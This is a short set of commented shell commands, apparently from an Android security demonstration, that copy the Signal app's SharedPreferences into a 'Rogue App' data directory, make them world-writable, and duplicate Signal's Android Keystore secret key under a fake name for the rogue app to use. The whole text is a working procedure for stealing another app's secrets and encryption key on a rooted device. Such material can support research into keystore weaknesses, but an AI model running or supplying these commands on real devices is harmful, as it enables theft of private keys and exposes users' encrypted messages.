// copy SharedPreferences to Rogue App.
cd /data/data/com.android.keystore.androidkeystoredemo
mkdir shared_prefs
cd shared_prefs/
cp /data/data/org.thoughtcrime.securesms/shared_prefs/* ./
chmod 777 -R /data/data/com.android.keystore.androidkeystoredemo/shared_prefs/

// copy Android Keystore SecretKey to Rogue App
cd /data/misc/keystore/user_0
ls | grep Signal
cp <UID>_USRPKEY_SignalSecret <UID>_USRPKEY_FAKE_SignalSecret


